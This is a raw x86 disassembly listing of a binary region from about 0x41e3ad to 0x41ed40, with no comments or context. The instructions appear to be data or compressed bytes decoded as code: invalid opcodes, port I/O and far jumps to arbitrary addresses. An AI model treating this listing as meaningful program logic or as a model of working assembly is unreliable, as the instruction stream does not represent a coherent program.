  41e3ad:	add    BYTE PTR [ebx+0x5c],dh
  41e3b0:	mov    BYTE PTR [ecx+0x7a],cl
  41e3b3:	sub    eax,0xae40f389
  41e3b8:	das    
  41e3b9:	punpcklbw mm5,DWORD PTR [ecx]
  41e3bc:	out    dx,eax
  41e3bd:	in     eax,0xae
  41e3bf:	jnp    0x41e3de
  41e3c1:	leave  
  41e3c2:	pop    ebp
  41e3c3:	test   ecx,ecx
  41e3c5:	repz inc eax
  41e3c7:	pusha  
  41e3c8:	lods   eax,DWORD PTR ds:[esi]
  41e3c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e3ca:	jge    0x41e37a
  41e3cc:	sub    ch,bh
  41e3ce:	or     DWORD PTR [edx],eax
  41e3d0:	je     0x41e443
  41e3d2:	xor    eax,0x83f6e45c
  41e3d7:	pop    esi
  41e3d8:	and    al,0xb2
  41e3da:	fisubr DWORD PTR [ebx]
  41e3dc:	jle    0x41e374
  41e3de:	push   esi
  41e3df:	rcr    BYTE PTR [esi],0xdb
  41e3e2:	in     al,0xef
  41e3e4:	je     0x41e398
  41e3e6:	nop
  41e3e7:	sbb    BYTE PTR [bx+di+0x7],bh
  41e3eb:	jnp    0x41e3bf
  41e3ed:	push   cs
  41e3ee:	retf   0x90e9
  41e3f1:	inc    esp
  41e3f2:	adc    BYTE PTR [edi+0x22],cl
  41e3f5:	and    eax,0x1b061aba
  41e3fa:	push   es
  41e3fb:	imul   bh
  41e3fd:	in     al,dx
  41e3fe:	nop
  41e3ff:	add    eax,0x6c0c3b0b
  41e404:	push   0xcee9ec00
  41e409:	pop    ebp
  41e40a:	pop    edi
  41e40b:	out    0x13,al
  41e40d:	mov    ebp,0x6da0132c
  41e412:	mov    bh,BYTE PTR [ecx+0x27]
  41e415:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e416:	jp     0x41e3bb
  41e418:	ret    0xa84
  41e41b:	imul   esp,esi,0xffffffc3
  41e41e:	jno    0x41e426
  41e420:	dec    eax
  41e421:	or     BYTE PTR [ebx+0xefcb7b8],0x6c
  41e428:	and    ch,BYTE PTR [ecx+0x758bf02a]
  41e42e:	(bad)  
  41e42f:	jno    0x41e43b
  41e431:	out    dx,al
  41e432:	cmp    eax,0x3f641bd0
  41e437:	into   
  41e438:	mov    edi,0x75860a29
  41e43d:	ret    
  41e43e:	jle    0x41e482
  41e440:	cmp    eax,0x511be3cb
  41e445:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e446:	in     al,dx
  41e447:	jmp    FWORD PTR [ecx-0x6e]
  41e44a:	or     ebx,DWORD PTR [ebx]
  41e44c:	daa    
  41e44d:	dec    edx
  41e44e:	shl    BYTE PTR [ebx-0x4eca4bfb],0x5e
  41e455:	sbb    eax,0x3d8bdc23
  41e45a:	daa    
  41e45b:	aas    
  41e45c:	mov    WORD PTR [eax-0x5c],?
  41e45f:	or     eax,0x5ce19f52
  41e464:	adc    eax,0xd723df85
  41e469:	in     al,dx
  41e46a:	fwait
  41e46b:	lahf   
  41e46c:	xor    bl,al
  41e46e:	adc    DWORD PTR [ecx],esi
  41e470:	imul   edx,DWORD PTR [edi],0x9c8aeecb
  41e476:	leave  
  41e477:	mov    dh,0xae
  41e479:	sub    ch,BYTE PTR [ecx+edx*4-0x7b8bd087]
  41e480:	ret    0xaea5
  41e483:	loopne 0x41e45d
  41e485:	outs   dx,DWORD PTR ss:[esi]
  41e487:	mov    esi,0x60ea1aba
  41e48c:	fdivr  QWORD PTR [edx+0x1f]
  41e48f:	imul   ebx,edi,0x4a
  41e492:	hlt    
  41e493:	xor    DWORD PTR ds:0x418f1057,eax
  41e499:	icebp  
  41e49a:	dec    edx
  41e49b:	ins    DWORD PTR es:[edi],dx
  41e49c:	retf   0x863b
  41e49f:	adc    al,0xb6
  41e4a1:	cmp    BYTE PTR [eax-0x3c],dh
  41e4a4:	mov    al,0xdb
  41e4a6:	xchg   edx,eax
  41e4a7:	in     eax,0x6b
  41e4a9:	xchg   DWORD PTR [ecx],ecx
  41e4ab:	ficomp WORD PTR [esi+0x1938da96]
  41e4b1:	ins    DWORD PTR es:[edi],dx
  41e4b2:	ss pushf 
  41e4b4:	sbb    eax,DWORD PTR [eax]
	...
  41e516:	and    BYTE PTR [edx-0x35],ch
  41e519:	dec    ebx
  41e51a:	retf   
  41e51b:	jmp    0x41e4bd
  41e51d:	imul   ecx,DWORD PTR [edi+0x51],0xffffff9a
  41e521:	push   ss
  41e522:	dec    edi
  41e523:	mov    al,0x82
  41e525:	fdecstp 
  41e527:	inc    eax
  41e528:	add    DWORD PTR [eax],eax
  41e52a:	pop    es
  41e52b:	add    DWORD PTR [eax],eax
  41e52d:	add    BYTE PTR [edi+0x7c25597f],cl
  41e533:	dec    ecx
  41e534:	stc    
  41e535:	pusha  
  41e536:	aad    0xaa
  41e538:	inc    edi
  41e539:	fmul   QWORD PTR [edx]
  41e53b:	jae    0x41e4db
  41e53d:	or     ah,dl
  41e53f:	aad    0x61
  41e541:	fistp  DWORD PTR [ebx+0x1fb4de6b]
  41e547:	pop    ebx
  41e548:	cmp    bl,BYTE PTR [eax]
  41e54a:	xchg   ebx,eax
  41e54b:	or     bh,dl
  41e54d:	or     BYTE PTR [esi+0x2c5a2393],al
  41e553:	mov    ds:0x4dccbf0c,eax
  41e558:	jmp    0x4dd22e4c
  41e55d:	iret   
  41e55e:	sbb    eax,DWORD PTR [ebx+0xff37677]
  41e564:	out    dx,al
  41e565:	add    dl,dl
  41e567:	pop    esi
  41e568:	sub    ah,0xd2
  41e56b:	xchg   ebp,eax
  41e56c:	in     al,dx
  41e56d:	xor    ch,BYTE PTR [edx-0x7c]
  41e570:	lds    edi,FWORD PTR [edx+0x49]
  41e573:	repz sahf 
  41e575:	xchg   ecx,eax
  41e576:	dec    edi
  41e577:	int3   
  41e578:	popf   
  41e579:	pop    edi
  41e57a:	jge    0x41e539
  41e57c:	rcr    DWORD PTR [ecx-0x633c0905],1
  41e582:	adc    BYTE PTR [esi+ecx*8-0x4c],0x4a
  41e587:	repz arpl dx,cx
  41e58a:	enter  0x3597,0x5a
  41e58e:	repz fbstp TBYTE PTR [ebp+0x1b]
  41e592:	mov    al,0x1c
  41e594:	fstp   TBYTE PTR [edx-0x52bf5e78]
  41e59a:	mov    ch,0x71
  41e59c:	jnp    0x41e521
  41e59e:	xchg   esp,eax
  41e59f:	cld    
  41e5a0:	or     bh,bl
  41e5a2:	dec    ebp
  41e5a3:	pop    edx
  41e5a4:	push   cs
  41e5a5:	jo     0x41e59d
  41e5a7:	xor    ebp,edi
  41e5a9:	inc    ebp
  41e5aa:	jmp    0x742a3e66
  41e5af:	xchg   ebp,eax
  41e5b0:	pusha  
  41e5b1:	cli    
  41e5b2:	add    BYTE PTR [edi+eax*8-0x4a],bl
  41e5b6:	mov    dh,0x7e
  41e5b8:	popf   
  41e5b9:	sub    edi,DWORD PTR [ebp+0x6f2f1a8]
  41e5bf:	pusha  
  41e5c0:	or     BYTE PTR [edi],bl
  41e5c2:	mov    edi,0x81d84584
  41e5c7:	pop    ebx
  41e5c8:	into   
  41e5c9:	stc    
  41e5ca:	dec    esp
  41e5cb:	pushf  
  41e5cc:	out    0x84,eax
  41e5ce:	add    ebp,DWORD PTR [ebx+0x7d]
  41e5d1:	ret    
  41e5d2:	(bad)  
  41e5d3:	push   0x5b
  41e5d5:	call   0xcfe5219d
  41e5da:	jb     0x41e5c7
  41e5dc:	shl    DWORD PTR [edi+0x6a],0xba
  41e5e0:	int3   
  41e5e1:	inc    edx
  41e5e2:	bound  ebp,QWORD PTR [ecx]
  41e5e4:	mov    ah,BYTE PTR [edx]
  41e5e6:	popf   
  41e5e7:	sbb    DWORD PTR [ebx-0x35],ebx
  41e5ea:	jne    0x41e5f9
  41e5ec:	sbb    BYTE PTR [edx+0x7b9306a1],dh
  41e5f2:	(bad)  
  41e5f3:	pop    ds
  41e5f4:	imul   ebp,DWORD PTR [ebp-0x48d3641d],0x480e5c9d
  41e5fe:	mov    ebp,0xd3fe4500
  41e603:	jns    0x41e5fb
  41e605:	repnz dec eax
  41e607:	sti    
  41e608:	aam    0x34
  41e60a:	add    eax,0xc3b5ddde
  41e60f:	push   edx
  41e611:	cmp    BYTE PTR [ecx],dh
  41e613:	cdq    
  41e614:	xor    eax,0xa2d458e9
  41e619:	scas   eax,DWORD PTR es:[edi]
  41e61a:	push   edi
  41e61b:	sbb    al,0x14
  41e61d:	add    esp,DWORD PTR [esi]
  41e61f:	mov    cs,esp
  41e621:	das    
  41e622:	mov    esp,0x5182ffe
  41e627:	popa   
  41e628:	or     eax,0x219d69b2
  41e62d:	inc    esp
  41e62e:	fs stc 
  41e630:	xchg   ecx,eax
  41e631:	inc    edi
  41e632:	pop    eax
  41e633:	sbb    DWORD PTR [edx],edi
	...
  41e695:	add    ch,al
  41e697:	cwde   
  41e698:	loope  0x41e6ef
  41e69a:	std    
  41e69b:	jge    0x41e692
  41e69d:	cwde   
  41e69e:	xchg   edx,eax
  41e69f:	fmul   st(5),st
  41e6a1:	mov    ds:0x5d800510,al
  41e6a6:	std    
  41e6a7:	inc    ecx
  41e6a8:	add    DWORD PTR [eax],eax
  41e6aa:	pop    es
  41e6ab:	add    DWORD PTR [eax],eax
  41e6ad:	add    dl,bl
  41e6af:	outs   dx,BYTE PTR ds:[esi]
  41e6b0:	and    BYTE PTR ds:0x4dfd8972,dh
  41e6b6:	out    dx,ax
  41e6b8:	cmp    BYTE PTR [ecx-0x74],cl
  41e6bb:	xor    dh,bh
  41e6bd:	dec    eax
  41e6be:	push   esi
  41e6bf:	lock adc ah,BYTE PTR [ebp+0x32]
  41e6c3:	out    0xec,al
  41e6c5:	add    edi,ebp
  41e6c7:	pusha  
  41e6c8:	stc    
  41e6c9:	das    
  41e6ca:	in     eax,0x64
  41e6cc:	adc    al,0xb
  41e6ce:	inc    esp
  41e6cf:	stos   BYTE PTR es:[edi],al
  41e6d0:	sub    esp,eax
  41e6d2:	cwde   
  41e6d3:	in     eax,0x38
  41e6d5:	stos   BYTE PTR es:[edi],al
  41e6d6:	cmc    
  41e6d7:	nop
  41e6d8:	inc    edx
  41e6d9:	mov    edx,0xf35b2d7d
  41e6de:	pop    ebx
  41e6df:	daa    
  41e6e0:	mov    al,0x7
  41e6e2:	call   0xcda2:0xd853a5cf
  41e6e9:	cmp    al,0x6d
  41e6eb:	push   es
  41e6ec:	pop    es
  41e6ed:	mov    edi,0x60ccf498
  41e6f2:	sub    al,0xed
  41e6f4:	mov    bl,0x11
  41e6f6:	ret    
  41e6f7:	sbb    BYTE PTR fs:[esp+ecx*2],dl
  41e6fb:	mov    eax,0xcc783fb9
  41e700:	test   eax,0xbdcffe1b
  41e705:	in     al,0xba
  41e707:	daa    
  41e708:	cld    
  41e709:	repnz mov esp,0x758c8dec
  41e70f:	mov    esp,0x806856ea
  41e714:	les    ebx,FWORD PTR [ebx-0x70]
  41e717:	enter  0x3eb0,0x2a
  41e71b:	adc    eax,0x85b153ad
  41e720:	das    
  41e721:	sbb    BYTE PTR [ecx-0x360106d1],ch
  41e727:	test   bl,0xfb
  41e72a:	push   esp
  41e72b:	pop    esi
  41e72c:	pop    esp
  41e72d:	test   al,0x75
  41e72f:	or     BYTE PTR [ebp+0x699284b9],bh
  41e735:	mov    bh,BYTE PTR [eax-0x44aa2afc]
  41e73b:	les    edi,FWORD PTR [ebx+0x776a7d8f]
  41e741:	sub    eax,0xb19eeb66
  41e746:	(bad)  
  41e747:	jns    0x41e757
  41e749:	mov    esp,0xf06dc3a1
  41e74e:	mov    al,ds:0xa6334e97
  41e753:	test   edi,edi
  41e755:	cld    
  41e756:	or     al,0x35
  41e758:	fsubr  QWORD PTR es:[ecx-0x7e]
  41e75c:	xor    ebp,DWORD PTR [esi-0x53]
  41e75f:	mov    BYTE PTR [eax],bh
  41e761:	div    BYTE PTR [eax]
  41e763:	inc    edx
  41e764:	pushf  
  41e765:	stc    
  41e766:	sub    DWORD PTR [ebx-0x6b25ce1b],ebp
  41e76c:	xchg   esi,eax
  41e76d:	in     al,dx
  41e76e:	out    dx,al
  41e76f:	scas   eax,DWORD PTR es:[edi]
  41e770:	xchg   esi,eax
  41e771:	sub    eax,DWORD PTR [eax]
  41e773:	aas    
  41e774:	cld    
  41e775:	jmp    0x41e711
  41e777:	adc    eax,0x3d3171d1
  41e77c:	mov    ds:0x6c411ecb,eax
  41e781:	lahf   
  41e782:	inc    ecx
  41e783:	std    
  41e784:	push   ds
  41e785:	idiv   BYTE PTR [ecx-0x7b]
  41e788:	xor    DWORD PTR [ecx+0x25],esp
  41e78b:	jae    0x41e746
  41e78d:	or     eax,0xe5f1fcbf
  41e792:	data16 aaa 
  41e794:	clc    
  41e795:	(bad)  [ecx+0x25bf26e0]
  41e79b:	sub    ecx,DWORD PTR [edx-0xa]
  41e79e:	cmp    eax,0xedbaad61
  41e7a3:	in     al,dx
  41e7a4:	jae    0x41e74f
  41e7a6:	pop    es
  41e7a7:	xor    DWORD PTR [ebx-0x51],ebx
  41e7aa:	xchg   esp,eax
  41e7ab:	and    al,0x67
  41e7ad:	mov    BYTE PTR [ebp+0x48504fe7],ch
  41e7b3:	adc    DWORD PTR [eax],esp
	...
  41e815:	add    BYTE PTR ds:0x9e5c8a39,ch
  41e81b:	(bad)  
  41e81c:	(bad)  
  41e81d:	jns    0x41e875
  41e81f:	imul   ebx,DWORD PTR [esi+eiz*2],0x1f
  41e823:	fld    st(1)
  41e825:	ds add al,0x43
  41e828:	add    DWORD PTR [eax],eax
  41e82a:	pop    es
  41e82b:	add    DWORD PTR [eax],eax
  41e82d:	add    al,bh
  41e82f:	pop    edi
  41e830:	shl    DWORD PTR [edi-0x60],cl
  41e833:	jae    0x41e843
  41e835:	fwait
  41e836:	mov    DWORD PTR [eax+eiz*8-0x6e5b7de7],esi
  41e83d:	int3   
  41e83e:	sub    dh,BYTE PTR [edi+0x52]
  41e841:	js     0x41e83d
  41e843:	pop    edx
  41e844:	inc    eax
  41e845:	jp     0x41e8b3
  41e847:	cli    
  41e848:	and    eax,0x419576a7
  41e84d:	inc    ebp
  41e84e:	pop    edi
  41e84f:	iret   
  41e850:	sbb    DWORD PTR [eax+0x3b],eax
  41e853:	das    
  41e854:	mov    bl,0x74
  41e856:	jb     0x41e819
  41e858:	pushf  
  41e859:	test   eax,0x9e49e31
  41e85e:	cmp    al,0x50
  41e860:	dec    ecx
  41e861:	pop    ebx
  41e862:	jmp    0x362cec46
  41e867:	imul   esi,DWORD PTR [esi+0x63],0x4566aab3
  41e86e:	dec    esp
  41e86f:	stc    
  41e870:	and    ebx,DWORD PTR [edx+eax*4+0x50]
  41e874:	inc    ebp
  41e875:	(bad)  [edx]
  41e877:	stc    
  41e878:	push   edi
  41e879:	mov    dl,ch
  41e87b:	cmp    eax,0x7f23c0bf
  41e880:	cmp    ah,BYTE PTR [esi+0x6c7880b4]
  41e886:	push   es
  41e887:	mov    esp,0x60eaff1d
  41e88c:	jle    0x41e83c
  41e88e:	rcl    BYTE PTR [edi],0xb5
  41e891:	ret    
  41e892:	and    dl,0xc9
  41e895:	ins    DWORD PTR es:[edi],dx
  41e896:	loopne 0x41e895
  41e898:	xchg   esp,eax
  41e899:	add    bh,BYTE PTR [edx-0x25]
  41e89c:	sub    eax,0x7685f2ef
  41e8a1:	add    cl,BYTE PTR [eax+0x3b]
  41e8a4:	push   ds
  41e8a5:	int3   
  41e8a6:	dec    edi
  41e8a7:	js     0x8aa3422e
  41e8ad:	aam    0x7d
  41e8af:	push   ecx
  41e8b0:	jb     0x41e8c0
  41e8b2:	rcl    BYTE PTR [esp+ecx*4-0x508b2488],cl
  41e8b9:	mov    eax,ds:0x1d9f008c
  41e8be:	int3   
  41e8bf:	scas   eax,DWORD PTR es:[edi]
  41e8c0:	mov    cl,0x6e
  41e8c2:	sbb    BYTE PTR [edx-0x14a97be1],0xfc
  41e8c9:	jge    0x41e886
  41e8cb:	(bad)  
  41e8cc:	loopne 0x41e94d
  41e8ce:	sbb    eax,0x99972829
  41e8d3:	mov    BYTE PTR [edx-0x185a4dd2],bl
  41e8d9:	cmp    DWORD PTR [esi],esp
  41e8db:	jmp    0x525fe5da
  41e8e0:	and    BYTE PTR ds:[esi-0x163a2ebd],ah
  41e8e7:	es call 0x6e7d:0x8c99c816
  41e8ef:	fs pop esi
  41e8f1:	adc    BYTE PTR [ecx+ecx*8-0x61],al
  41e8f5:	dec    ebp
  41e8f6:	add    edx,DWORD PTR [ebp-0x4ded6e1c]
  41e8fc:	in     al,dx
  41e8fd:	push   cs
  41e8fe:	outs   dx,BYTE PTR ds:[esi]
  41e8ff:	repnz sti 
  41e901:	gs daa 
  41e903:	gs retf 0xc56
  41e907:	in     al,0xda
  41e909:	inc    esp
  41e90a:	mov    dh,0x27
  41e90c:	mov    ah,0x50
  41e90e:	mov    WORD PTR [ebp-0x5],?
  41e911:	cmp    eax,eax
  41e913:	adc    BYTE PTR [eax],al
  41e915:	(bad)  [ebp-0x4c5d5da3]
  41e91b:	dec    edx
  41e91c:	out    dx,al
  41e91d:	call   0xd6c10d1d
  41e922:	jae    0x41e8e2
  41e924:	dec    ebp
  41e925:	adc    dl,BYTE PTR [edx-0x2d]
  41e928:	sahf   
  41e929:	test   al,0xd8
  41e92b:	or     eax,0x34b507c2
  41e930:	loopne 0x41e94d
  41e932:	aaa    
  41e933:	or     al,0x8f
	...
  41e995:	add    BYTE PTR [eax-0x3],bh
  41e998:	ret    0xc766
  41e99b:	jg     0x41e999
  41e99d:	(bad)  
  41e99e:	jmp    0x41e94c
  41e9a0:	repnz xchg ecx,eax
  41e9a2:	fwait
  41e9a3:	hlt    
  41e9a4:	push   ecx
  41e9a5:	adc    al,0xb
  41e9a7:	inc    esp
  41e9a8:	add    DWORD PTR [eax],eax
  41e9aa:	pop    es
  41e9ab:	add    DWORD PTR [eax],eax
  41e9ad:	add    BYTE PTR [ebx],bl
  41e9af:	cdq    
  41e9b0:	fs push es
  41e9b2:	clc    
  41e9b3:	jge    0x41e9bd
  41e9b5:	jb     0x41e9a7
  41e9b7:	sub    esp,DWORD PTR [edi]
  41e9b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9ba:	ret    
  41e9bb:	xchg   ecx,eax
  41e9bc:	popf   
  41e9bd:	xor    al,BYTE PTR [ecx-0x42ae5f75]
  41e9c3:	fwait
  41e9c4:	cmp    BYTE PTR [edx],al
  41e9c6:	adc    DWORD PTR [edi+0x264c6da3],eax
  41e9cc:	int3   
  41e9cd:	das    
  41e9ce:	pop    eax
  41e9cf:	test   al,0xb1
  41e9d1:	jbe    0x41e9e2
  41e9d3:	fst    DWORD PTR [esp+eax*2+0x7ab09ab8]
  41e9da:	pop    eax
  41e9db:	je     0x41e9d3
  41e9dd:	hlt    
  41e9de:	hlt    
  41e9df:	mov    esi,0x60732654
  41e9e4:	sub    edi,DWORD PTR ds:0xe176e077
  41e9ea:	fild   WORD PTR [edx]
  41e9ec:	test   al,0xa1
  41e9ee:	dec    ecx
  41e9ef:	mov    eax,ds:0xdf10d1a
  41e9f4:	cmc    
  41e9f5:	push   esp
  41e9f6:	test   BYTE PTR [ebp-0x7648700e],0x3
  41e9fd:	pop    ss
  41e9fe:	mov    eax,0x4ce1d360
  41ea03:	jle    0x41ea63
  41ea05:	pop    eax
  41ea06:	popa   
  41ea07:	sub    DWORD PTR [ebx+0x46],eax
  41ea0a:	icebp  
  41ea0b:	dec    edx
  41ea0c:	inc    edi
  41ea0d:	fdiv   QWORD PTR [eax-0x2c]
  41ea10:	push   edx
  41ea11:	aas    
  41ea12:	sub    al,BYTE PTR [edx+0x66]
  41ea15:	xor    eax,0xf3bce515
  41ea1a:	sub    BYTE PTR [ebp+0x1d],cl
  41ea1d:	cmp    ch,al
  41ea1f:	or     bl,BYTE PTR [eax+ebp*2-0x19]
  41ea23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea24:	out    0x8b,al
  41ea26:	adc    eax,0x5a862d10
  41ea2b:	push   es
  41ea2c:	push   edx
  41ea2d:	or     DWORD PTR ds:[eax+0x1c],ebp
  41ea31:	js     0x41ea7a
  41ea33:	xchg   ebx,eax
  41ea34:	jmp    FWORD PTR [edx]
  41ea36:	inc    edx
  41ea37:	or     DWORD PTR [ebx],edi
  41ea39:	sub    BYTE PTR [eax],0x20
  41ea3c:	dec    esp
  41ea3d:	lahf   
  41ea3e:	std    
  41ea3f:	xor    bh,BYTE PTR ds:0x42122a82
  41ea45:	jmp    0x1f04e652
  41ea4a:	dec    esp
  41ea4b:	scas   al,BYTE PTR es:[edi]
  41ea4c:	adc    al,ch
  41ea4e:	mov    eax,ds:0x2ce9ca53
  41ea53:	push   es
  41ea54:	inc    esp
  41ea55:	cmp    al,0x2
  41ea57:	(bad)  
  41ea58:	cdq    
  41ea59:	out    dx,al
  41ea5a:	add    edx,ecx
  41ea5c:	sbb    DWORD PTR [edx],edi
  41ea5e:	push   ecx
  41ea5f:	fsub   QWORD PTR [ebp+eax*2-0x1cbe8c1c]
  41ea66:	(bad)  
  41ea67:	retf   
  41ea68:	mov    ebp,0xa768f629
  41ea6d:	xchg   edi,eax
  41ea6e:	sbb    BYTE PTR [ebx+ebx*8],dl
  41ea71:	inc    ebp
  41ea72:	mov    cl,0xa3
  41ea74:	mov    ecx,0x5c36622b
  41ea79:	adc    DWORD PTR [edx],eax
  41ea7b:	sub    BYTE PTR [eax+0x643017e6],0xfb
  41ea82:	sub    al,0xdf
  41ea84:	dec    edx
  41ea85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea86:	ss mov al,0xa7
  41ea89:	push   edi
  41ea8a:	es jecxz 0x41eaf7
  41ea8d:	cld    
  41ea8e:	xlat   BYTE PTR ds:[ebx]
  41ea8f:	jno    0x41eafc
  41ea91:	fnsave [edi+ecx*2+0x7c7ca3f]
  41ea98:	cmp    eax,0xd9287591
  41ea9d:	or     DWORD PTR [esi+0x3950d91e],esp
  41eaa3:	and    DWORD PTR [ebp+eiz*2+0x5348ac5f],edi
  41eaaa:	cmp    eax,0x5b5a709f
  41eaaf:	dec    edx
  41eab0:	cli    
  41eab1:	mov    ss,WORD PTR [ebx+0x8fca]
	...
  41eb13:	add    BYTE PTR [eax],al
  41eb15:	add    BYTE PTR [edx],dl
  41eb17:	das    
  41eb18:	mov    esi,DWORD PTR [edi+edi*4+0x22af3fb4]
  41eb1f:	and    ebp,DWORD PTR [eax]
  41eb21:	fstp   DWORD PTR [ecx-0x5b]
  41eb24:	aad    0xea
  41eb26:	adc    al,BYTE PTR [ebp+0x1]
  41eb29:	add    BYTE PTR [edi],al
  41eb2b:	add    DWORD PTR [eax],eax
  41eb2d:	add    BYTE PTR [esi+0x45693e98],cl
  41eb33:	test   BYTE PTR [ebp-0x2359e692],0x72
  41eb3a:	and    eax,0x44ca0d55
  41eb3f:	pop    ebp
  41eb40:	xchg   BYTE PTR [ebp-0x3e7db33d],bh
  41eb46:	leave  
  41eb47:	mov    BYTE PTR ds:0x38571c9e,ch
  41eb4d:	int    0x95
  41eb4f:	push   ebp
  41eb50:	xchg   DWORD PTR [ebp-0x40],ebx
  41eb53:	and    eax,0x3e56e91f
  41eb58:	cmp    DWORD PTR [ecx+0x1bcc71e2],ebx
  41eb5e:	pusha  
  41eb5f:	arpl   WORD PTR es:[esi-0x3d4b3e0c],di
  41eb66:	(bad)  
  41eb67:	in     al,dx
  41eb68:	fld    TBYTE PTR [edx-0x2c22f276]
  41eb6e:	js     0x41ebc5
  41eb70:	push   ebx
  41eb71:	(bad)  
  41eb73:	ss cdq 
  41eb75:	cmp    ah,BYTE PTR [edx-0x41]
  41eb78:	mov    ss,WORD PTR [ecx-0x12622588]
  41eb7e:	test   dl,ch
  41eb80:	cld    
  41eb81:	fisubr DWORD PTR [bp-0x7038]
  41eb86:	outs   dx,BYTE PTR ds:[esi]
  41eb87:	ret    
  41eb88:	push   ss
  41eb89:	xor    ah,BYTE PTR [edx]
  41eb8b:	in     al,dx
  41eb8c:	mov    cl,0x4d
  41eb8e:	xor    DWORD PTR [ebp+0x35],esi
  41eb91:	or     BYTE PTR [ebx-0x39d8bde3],dl
  41eb97:	cdq    
  41eb98:	cli    
  41eb99:	call   0xf45e:0xe9ee30ef
  41eba0:	pop    ecx
  41eba1:	cmp    dl,dh
  41eba3:	clc    
  41eba4:	jb     0x41eb2a
  41eba6:	adc    bh,ah
  41eba8:	gs mov esp,0x700590c
  41ebae:	lahf   
  41ebaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ebb0:	imul   edx,edi,0xffffffbf
  41ebb3:	xor    al,dl
  41ebb5:	js     0x41eb55
  41ebb7:	div    BYTE PTR [eax-0x72]
  41ebba:	dec    ebp
  41ebbb:	cdq    
  41ebbc:	sbb    bh,BYTE PTR [ebx-0x22b88ab0]
  41ebc2:	repnz pop ebx
  41ebc4:	jmp    0x41ebe0
  41ebc6:	push   esp
  41ebc7:	fdivr  DWORD PTR [eax+0x1e]
  41ebca:	pop    es
  41ebcb:	popa   
  41ebcc:	int    0x65
  41ebce:	jmp    0x41ebbc
  41ebd0:	pop    edx
  41ebd1:	clc    
  41ebd2:	inc    esp
  41ebd3:	add    al,0x97
  41ebd5:	and    BYTE PTR [edx+ebx*1],cl
  41ebd8:	or     dh,al
  41ebda:	hlt    
  41ebdb:	inc    BYTE PTR [esi-0x36]
  41ebde:	hlt    
  41ebdf:	dec    ecx
  41ebe0:	jb     0x41eb92
  41ebe2:	sbb    BYTE PTR [ebp+0x48],cl
  41ebe5:	jle    0x41eb6e
  41ebe7:	not    DWORD PTR [edi]
  41ebe9:	xor    ebx,DWORD PTR [esi]
  41ebeb:	lods   eax,DWORD PTR ds:[esi]
  41ebec:	sti    
  41ebed:	je     0x41ebd3
  41ebef:	(bad)  
  41ebf0:	lds    ebx,FWORD PTR [eax]
  41ebf2:	and    al,BYTE PTR [esp+esi*1+0x20]
  41ebf6:	push   esp
  41ebf7:	xor    DWORD PTR [edx+0x45],edx
  41ebfa:	cmp    bh,BYTE PTR [eax-0x63]
  41ebfd:	inc    ebp
  41ebfe:	addr16 pop ecx
  41ec00:	(bad)  
  41ec01:	sbb    DWORD PTR [eax],ebx
  41ec03:	sbb    edi,DWORD PTR [edi+0x2063f327]
  41ec09:	xchg   esi,eax
  41ec0a:	aas    
  41ec0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec0c:	popf   
  41ec0d:	arpl   WORD PTR [edx],ax
  41ec0f:	inc    ebp
  41ec10:	and    ch,BYTE PTR [ecx-0x1afc3ca6]
  41ec16:	mov    ds:0x42c0f353,eax
  41ec1b:	jmp    0x41ec36
  41ec1d:	xor    DWORD PTR [edx-0x151267a9],esi
  41ec23:	dec    edi
  41ec24:	les    eax,FWORD PTR [edx]
  41ec26:	stos   DWORD PTR es:[edi],eax
  41ec27:	mov    ds:0xbbfe635a,al
  41ec2c:	mov    esp,0x4c9ae10a
  41ec31:	loope  0x41ec1d
  41ec33:	(bad)  
  41ec34:	ret    
	...
  41ec95:	add    BYTE PTR [ecx-0xf],al
  41ec98:	(bad)
  41ec9b:	hlt    
  41ec9c:	gs icebp 
  41ec9e:	adc    ebx,edi
  41eca0:	ficom  WORD PTR [ecx]
  41eca2:	mov    ebx,0x19521666
  41eca7:	inc    esi
  41eca8:	add    DWORD PTR [eax],eax
  41ecaa:	pop    es
  41ecab:	add    DWORD PTR [eax],eax
  41ecad:	add    BYTE PTR [esi-0x19a03d40],al
  41ecb3:	adc    ebx,eax
  41ecb5:	ror    DWORD PTR [edi],1
  41ecb7:	jbe    0x41eccf
  41ecb9:	jnp    0x3456f4ca
  41ecbf:	sbb    BYTE PTR [ebx+0x7e],bh
  41ecc2:	xchg   bl,al
  41ecc4:	jb     0x41ecf2
  41ecc6:	aas    
  41ecc7:	pop    ebp
  41ecc8:	xor    DWORD PTR [edx],0x47d95635
  41ecce:	jmp    0x6ba5b83e
  41ecd3:	mov    DWORD PTR [eax],esi
  41ecd5:	js     0x41ec72
  41ecd7:	push   ecx
  41ecd8:	ficom  DWORD PTR [esi-0x4]
  41ecdb:	cmp    ch,ah
  41ecdd:	adc    al,0xb6
  41ecdf:	push   0x21
  41ece1:	sar    BYTE PTR [edi-0x5a],0xb6
  41ece5:	xchg   ebp,eax
  41ece6:	and    al,0x88
  41ece8:	jo     0x41ed67
  41ecea:	mov    ecx,0xbf4dddf7
  41ecef:	dec    DWORD PTR [ebp+0x6431c40d]
  41ecf5:	jmp    0x41ed52
  41ecf7:	sub    al,BYTE PTR [edi+0x4fb18d21]
  41ecfd:	bound  eax,QWORD PTR [eax]
  41ecff:	cdq    
  41ed00:	stos   DWORD PTR es:[edi],eax
  41ed01:	outs   dx,BYTE PTR ds:[esi]
  41ed02:	dec    eax
  41ed03:	mov    cl,BYTE PTR ds:0xf0f22d58
  41ed09:	bound  ebx,QWORD PTR [edi]
  41ed0b:	mov    al,BYTE PTR [ecx+0xdb8a40f]
  41ed11:	xchg   BYTE PTR [ebp-0x226fddbc],dh
  41ed17:	enter  0xfcc4,0xbe
  41ed1b:	add    al,0x1c
  41ed1e:	add    al,0x30
  41ed20:	ja     0x41ecdb
  41ed22:	xchg   BYTE PTR [ecx+ebp*1-0xb],bl
  41ed26:	test   DWORD PTR [edx+eiz*4-0x3339c759],esi
  41ed2d:	fdiv   DWORD PTR [edx]
  41ed30:	and    DWORD PTR [ebp-0xd0dd783],edi
  41ed36:	cmp    al,0xca
  41ed38:	inc    edi
  41ed39:	mov    BYTE PTR [ebp+edi*8+0x14916d47],al
  41ed40:	add    ebp,DWORD PTR [ebp-0x262736d1]
